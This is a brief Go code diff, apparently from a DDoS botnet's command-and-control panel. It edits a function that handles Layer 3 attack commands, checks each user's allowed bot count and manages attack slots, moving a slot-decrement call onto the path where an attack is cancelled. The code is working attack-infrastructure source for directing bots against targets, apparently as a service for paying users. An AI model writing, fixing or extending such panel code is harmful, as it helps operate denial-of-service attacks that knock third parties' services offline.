@@ -108,7 +108,6 @@ func HandleLayer3AttackCommand(user *models.User, command string, conn net.Conn)
 	if !canStartAttack(user, conn) {
 		return
 	}
-	defer decrementSlots(user)
 
 	var botCmdBuilder strings.Builder
 	botCmdBuilder.WriteString(command)
@@ -119,6 +118,7 @@ func HandleLayer3AttackCommand(user *models.User, command string, conn net.Conn)
 			botcount = bc
 		} else if bc > user.MaxBots {
 			util.WriteToConn(conn, fmt.Sprintf(ui.RED+"\rCancelled attack, your max bots are (%d)\033[0m\n"+ui.RESET, user.MaxBots))
+			decrementSlots(user)
 			return
 		}
 	}
